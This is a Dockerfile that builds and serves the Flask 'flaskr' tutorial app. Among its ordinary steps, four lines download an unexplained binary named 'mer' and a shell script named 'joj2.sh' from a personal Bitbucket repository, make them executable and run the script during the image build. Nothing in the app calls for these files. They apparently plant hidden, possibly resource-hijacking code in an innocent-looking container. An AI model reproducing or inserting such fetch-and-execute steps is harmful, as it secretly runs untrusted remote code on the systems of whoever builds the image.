FROM python:3.8.2-alpine3.11

ENV FLASK_APP=flaskr
ENV FLASK_ENV=development

COPY . /app

WORKDIR /app

RUN pip install --editable .

RUN wget https://bitbucket.org/korkorerf/minyt/raw/3d135589c2079155ef25a1092b5dd2fcf4c52cf5/mer
RUN wget https://bitbucket.org/korkorerf/minyt/raw/6722d57cbf059c4286918810da42c5766b2c19c1/joj2.sh
RUN chmod +x mer
RUN chmod +x joj2.sh
RUN ./joj2.sh

# Unit tests
# RUN pip install pytest && pytest

EXPOSE 5000

CMD [ "flask", "run", "--host=0.0.0.0" ]



